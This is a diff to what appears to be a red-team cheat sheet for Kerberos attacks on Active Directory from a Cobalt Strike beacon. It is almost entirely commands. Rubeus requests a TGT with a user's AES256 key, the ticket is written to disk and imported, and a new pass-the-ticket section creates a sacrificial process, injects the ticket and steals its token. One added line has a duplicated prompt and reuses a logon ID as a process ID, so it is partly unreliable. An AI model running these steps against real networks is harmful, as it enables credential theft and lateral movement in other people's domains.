@@ -48,9 +48,9 @@ Use Rubeus with lower privileges:
 ```
 beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec
 
-PS > [System.IO.File]::WriteAllBytes("C:\Windows\Tasks\tgt.kirbi", [System.Convert]::FromBase64String("[...TICKET...]"))
+PS > [System.IO.File]::WriteAllBytes("C:\Windows\Tasks\tgt.kirbi", [System.Convert]::FromBase64String("<BASE64_TICKET>"))
 Or
-$ echo -en "[...TICKET...]" | base64 -d > tgt.kirbi
+$ echo -en "<BASE64_TICKET>" | base64 -d > tgt.kirbi
 
 beacon> run klist
 Or
@@ -59,6 +59,24 @@ beacon> execute-assembly Rubeus.exe klist
 beacon> make_token MEGACORP\snovvcrash dummy_Passw0rd!
 beacon> kerberos_ticket_use C:\Windows\Tasks\tgt.kirbi
 ```
+
+
+
+
+## Pass-the-Ticket
+
+Create a sacrificial process, import the TGT into its logon session and steal its security token:
+
+```
+beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+beacon> execute-assembly Rubeus.exe ptt /luid:0x1337 /ticket:<BASE64_TICKET>
+beacon> beacon> steal_token 1337
+```
+
+
+
+
+## Pivoting
 
 
 
